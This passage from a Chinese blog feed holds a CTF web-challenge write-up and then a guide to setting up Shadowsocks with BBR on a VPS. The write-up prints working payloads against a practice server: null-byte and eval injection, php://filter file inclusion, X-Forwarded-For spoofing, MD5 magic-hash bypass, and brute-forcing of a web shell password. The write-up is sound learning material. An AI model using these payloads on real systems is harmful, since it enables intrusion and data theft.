class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>nctf差不多的题目，必须是1-9的数字，而且要包含#biubiubiu<br>坑点:#需要用url编码<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/15.php?ctf=1%00%23biubiubiu</span><br></pre></td></tr></table></figure></p><h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"POST"</span> == <span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (0 &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, <span class="variable">$password</span>)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag'</span>;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$reg</span> = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line"><span class="keyword">if</span> (6 &gt; preg_match_all(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="variable">$c</span> = 0;</span><br><span class="line"><span class="variable">$ps</span> = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach (<span class="variable">$ps</span> as <span class="variable">$pt</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[[:<span class="variable">$pt</span>:]]+/"</span>, <span class="variable">$password</span>))</span><br><span class="line"><span class="variable">$c</span> += 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$c</span> &lt; 3) <span class="built_in">break</span>;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"42"</span> == <span class="variable">$password</span>) <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>post了一个空数组上去就弹出flag了…具体原因有待学习</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://s1.ax1x.com/2018/11/30/FmIdEQ.md.png" alt=""></h2><p>有两个题目挂掉了…….做不了暂时就写这么多吧…</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>flag在源码的注释里</p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>改一下text文本框的最大输入位数&gt;1即可</p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>GET方式传参即可</p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>post方式传参即可</p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题要求传参num不能是数字，而且num=1，一开始没有什么思路，认为是弱类型的绕过，传了true进去，发现无效，问了一下度娘，发现在数字后面加上%00截断，is_numeric()函数就不能识别为数字了…<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123.206.87.240:8002/get/index1.php?num=1%00</span><br></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>这题疯狂弹出对话框，阻止以后查看源码，果然全是alert弹窗，在最下面的注释里发现了一大串编码，不太认识：<br><img src="https://s1.ax1x.com/2018/12/01/FnGL36.png" alt=""><br>问了一下度娘，发现是unicode，直接在线解码即可</p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>进入windows/system32/drivers/etc/hosts中添加<strong>123.206.87.240  flag.baidu.com</strong>，然后直接访问域名即可</p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>这题如何让他停下?直接bp抓包拦截，然后一次一次执行，go了几次发现flag<br><img src="https://s1.ax1x.com/2018/12/01/FnJZDg.png" alt=""></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    include <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="built_in">eval</span>( <span class="string">"var_dump(<span class="variable">$a</span>);"</span>);</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>REQUEST默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。<br>这题的最终目的就是要看到<strong>flag.php</strong>里的内容，eval是执行$a里的内容，所以直接file(‘flag.php’)就可以<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8003/?hello=file(%27flag.php%27)</span><br></pre></td></tr></table></figure><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>这题花了点时间研究了一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable !</span><br><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>理解1</strong>：preg_match()是正则表达式的匹配，/^表示开始，$/表示结束，结束字符 \w包含[a-z,A-Z,,0-9]中的字符，+代表可以有一个或多个;<br><strong>理解2</strong>：$$args表示的是以$args为变量名的变量;<br><strong>理解3</strong>：$GLOBALS[]包含正在执行脚本所有超级全局变量的引用内容;<br>开头就提示flag在变量里，所以只要看看变量里都放了些什么就可以了，args=GLOABLS就可以将$$args解析成$GLOBALS,var_dump打印变量的相关信息<br>这样就可以显示出所有变量的内容<br><img src="https://s1.ax1x.com/2018/12/01/FnJjGq.png" alt=""><br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p>提示是jspfuck，查看源代码，复制下来放到google控制台跑一下<br><img src="https://s1.ax1x.com/2018/12/01/FnYWmF.png" alt=""><br>发现了ctf{whatfk}，提交提示离答案非常接近，要求是CTF头，所以全部大写提交，成功…</p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开发现什么都没有…查看源代码也没有什么东西，F12查看一波也没有什么发现，无奈之下用bp截取之后运行…以为有点难，没想到是水题…<br><img src="https://s1.ax1x.com/2018/12/01/FntDBD.png" alt=""></p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>嗯，挺漂亮的网页，查看半天也没发现什么奇怪的东西，就扫一波后台目录<br><img src="https://s1.ax1x.com/2018/12/01/FndK54.png" alt=""><br>发现了index.php和shell.php，打开shell.php如图：<br><img src="https://s1.ax1x.com/2018/12/01/FndlG9.png" alt=""><br>发现需要输入密码，bp抓一波，然后选择passwords字典暴力破解<br><img src="https://s1.ax1x.com/2018/12/01/Fn6vKH.png" alt=""><br>降序排列一波发现1110匹配项<br><img src="https://s1.ax1x.com/2018/12/01/Fnc9at.png" alt=""></p><h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>这题不太会，找到源码中的base64编码<br><img src="https://s1.ax1x.com/2018/12/01/Fn2QvF.png" alt=""><br>解码以后是test123，输入admin为用户名，test123为密码，发现不能访问，IP禁止访问，请联系本地管理员登录，也就是说需要本地登录才可以进去，所以就尝试着bp抓一波包，从大佬的wp中了解到这题需要<strong>伪装成本地访问</strong>才可以通过，伪装本地访问的方法就是在headers里面添加如下http头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/01/Fn2c5t.png" alt=""><br>弹出flag：<br><img src="https://s1.ax1x.com/2018/12/01/Fn2Ibj.png" alt=""></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>提示查看源码就查看一波源码，发现一大串url编码：<br><img src="https://s1.ax1x.com/2018/12/01/Fn2TVs.png" alt=""><br>解码后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> checkSubmit()</span><br><span class="line">&#123;</span><br><span class="line">var a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="built_in">return</span>!0;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="built_in">return</span>!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure><p>将67d709b2b54aa2aa648cf6e87a7114f1这一串数字提交到表单里直接出flag…(什么鬼玩意儿)<br><img src="https://s1.ax1x.com/2018/12/01/FnRpZ9.png" alt=""></p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>文件包含题，和nctf的文件包含如出一辙；<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>解析为base64编码，解码后发现flag</p><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>进去发现需要输入5位密码,就直接用burp爆破一下，先设置五位数字爆破<br><img src="https://s1.ax1x.com/2018/12/02/FKk4JJ.png" alt=""><br>等一下发现出现length不一样的项目，直接找到了flag<br><img src="https://s1.ax1x.com/2018/12/02/FKk5W9.png" alt=""></p><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>这题你点一下鼠标数值就会加一，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var clicks=0</span><br><span class="line">    $(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(<span class="string">"#cookie"</span>)</span><br><span class="line">        .mousedown(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">          $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .mouseup(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">          $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">          clicks++;</span><br><span class="line">          $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">          <span class="keyword">if</span>(clicks &gt;= 1000000)&#123;</span><br><span class="line">          var form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>查看源代码发现只要点击鼠标就会clicks++，method是POST，所以可以直接post一个clicks=1000000过去就可以了<br><img src="https://s1.ax1x.com/2018/12/02/FKAuyq.png" alt=""><br>得到flag<br><img src="https://s1.ax1x.com/2018/12/02/FKAlwT.png" alt=""></p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>提示备份直接进入index.php.bak,发现如下,是一个弱类型的MD5绕过，构造MD5值为0e开头的值就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);//返回从1到后面的字符</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);//key替换为<span class="string">''</span></span><br><span class="line">parse_str(<span class="variable">$str</span>);//字符串解析到变量</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>去掉第一个字符后，用’’替换key，也就是直接去掉key，然后字符串解析到变量，构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kekeyy1=s878926199a&amp;kekeyy2=QNKCDZO</span><br></pre></td></tr></table></figure><hr><p>持续更新…</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;萌新学习~
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>DigitalOcean+PuTTY+SS如何撸梯子</title>
    <link href="https://gardenia30.top/2018/12/22/DigitalOcean+PuTTY+SS%E5%A6%82%E4%BD%95%E6%92%B8%E6%A2%AF%E5%AD%90/"/>
    <id>https://gardenia30.top/2018/12/22/DigitalOcean+PuTTY+SS如何撸梯子/</id>
    <published>2018-12-22T13:34:39.000Z</published>
    <updated>2019-11-10T12:22:15.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>嘘~<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="购买VPS"><a href="#购买VPS" class="headerlink" title="购买VPS"></a>购买VPS</h2><p>早就听说有github学生包这个优惠活动，就提前申请了一波，一个edu邮箱就可以了，免费拿到digital ocean的50美元优惠兑换码，接着直接就可以创建DO的账户，从我的链接进去直接注册就可以免费赠送10刀<a href="https://m.do.co/c/091768c54a8a" target="_blank" rel="noopener">click here</a>，创建账户的前提就是充值5刀，折合35块吧，够我用一年了,非常划算。</p><p>总共拿到55美刀，买了个美国旧金山的服务器，5刀一个月，1TB流量，unbuntu系统，感觉还行，感觉后来速度也不错，推荐购买。</p><p>买了以后会发给你账户原始密码，直接进入Droplets页面进行设置，Launch Console进入命令行，输入原始密码进行登录，修改密码即可</p><p><img src="https://s1.ax1x.com/2018/12/22/FydSxK.png" alt="img"></p><h2 id="下载PuTTY"><a href="#下载PuTTY" class="headerlink" title="下载PuTTY"></a>下载PuTTY</h2><p>安装好，打开以后直接输入IP等一系列信息就可以直接登上去</p><p><img src="https://s1.ax1x.com/2018/12/22/FydBdJ.png" alt="img"></p><p>PuTTY是一个Telnet、SSH、rlogin、纯TCP以及串行接口连接软件，可以直接连接上我的VPS，当然Xshell也是一个不错的选择。</p><h2 id="配置VPS"><a href="#配置VPS" class="headerlink" title="配置VPS"></a>配置VPS</h2><p>1.build-essential安装</p><p>linux操作系统上面开发程序，光有了gcc 是不行的它还需要一个build-essential软件包作用是提供编译程序必须软件包的列表信息，也就是说 编译程序有了这个软件包，它才知道 头文件在哪 才知道库函数在哪，还会下载依赖的软件包   最后才组成一个开发环境，当然 build-essential包 安装时 需要的依赖包 有些你用不上  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential</span><br></pre></td></tr></table></figure><p>2.安装pip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-pip</span><br></pre></td></tr></table></figure><p>3.安装shadowsocks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure><p>4.更新软件列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>5.配置shadowsocks</p><p>linux自带了神器vim编辑器，学习一波用法<a href="http://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">我是链接啊啊啊！</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/shadowsocks.json</span><br></pre></td></tr></table></figure><p>新建ss配置文件，输入以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;server&quot;:&quot;::&quot;,</span><br><span class="line">&quot;server_port&quot;: 选一个端口就好,</span><br><span class="line">&quot;local_port&quot;: 1080,</span><br><span class="line">&quot;timeout&quot;:300,</span><br><span class="line">&quot;password&quot;: &quot;yourpassword&quot;,</span><br><span class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;,</span><br><span class="line">&quot;fast_open&quot;:true,</span><br><span class="line">&quot;workers&quot;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>:wq保存退出就好，此时已经完成了对ss的配置。</p><p>6.在VPS上运行shadowsocks</p><p>输入以下命令，看见started就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><p>7.本地接入ss</p><p>唉~移动网络真的是垃圾的一批，进github都要那么久，在github上down了一个shadowsocks.exe下来，输入刚刚配置的信息点击确定，打开启用系统代理即可</p><p>8.第八条专门用来吐槽我的今天的经历，真的是无f**k可说，经过千辛万苦连接上了ss但没想到访问不了Google，但是连我的手机热点和舍友的无线就可以，真的是……唉~算了，自己慢慢解决吧，终于查到了问题所在，我是直接插光纤上网的，而ss的启动系统代理默认的是给你打开局域网设置的代理，所以我**的忙活了那么久竟然是一个如此低端的问题，我还以为是我的ss配置错了……下面是解决办法。</p><h2 id="安装配置SwitchyOmega"><a href="#安装配置SwitchyOmega" class="headerlink" title="安装配置SwitchyOmega"></a>安装配置SwitchyOmega</h2><p>这是一个Google的插件，专门用来设置代理</p><p>不多说，扔两张图：</p><p><strong>全局代理设置：</strong></p><p><img src="https://s1.ax1x.com/2018/12/22/FywqhR.png" alt="img"></p><p><strong>PAC模式设置：</strong></p><p><img src="https://s1.ax1x.com/2018/12/22/Fywjc6.png" alt="img"></p><p>PAC设置的PAC网址就是打开局域网设置里面的脚本地址，填入以后应用，更新即可，PAC唯一的好处就是走国内的可以快一点，节省一点流量。</p><h2 id="BBR算法提速"><a href="#BBR算法提速" class="headerlink" title="BBR算法提速"></a>BBR算法提速</h2><p>不多说，速度还是挺慢的，需要Google发布的TCP BBR算法，给我的vps提一波速，Linux4.9的内核已经支持TCP BBR了。</p><p>1.先查看内核版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure><p>2.如果不够，将内核升级到4.9.10,先下载安装包；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.9.10/linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb</span><br></pre></td></tr></table></figure><p>3.安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb</span><br></pre></td></tr></table></figure><p>4.查看当前有哪些内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep linux-image</span><br></pre></td></tr></table></figure><p>5.删除旧的内核(我的是4.4)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get purge *4.4*</span><br></pre></td></tr></table></figure><p>6.更新引导</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure><p>7.重启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>8.编辑sysctl.conf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>在末尾添加如下两行后保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.core.default_qdisc=fq</span><br><span class="line">net.ipv4.tcp_congestion_control=bbr</span><br></pre></td></tr></table></figure><p>9.执行如下操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p           #使配置生效</span><br><span class="line"></span><br><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure><p>出现tcp_bbr即可，证明提速已经生效</p><p>10.刚刚已经重启了一次，所以要再次将shadowsocks在vps上跑起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>希望这对以后的学习可以有所帮助。不说了，继续撸密码学了……</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;嘘~
    
    </summary>
    
      <category term="VPS" scheme="https://gardenia30.top/categories/VPS/"/>
    
    
      <category term="my vps" scheme="https://gardenia30.top/tags/my-vps/"/>
    
  </entry>
  
  <entry>
    <title>算法导论总结</title>
    <link href="https://gardenia30.top/2018/11/08/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2018/11/08/算法笔记/</id>
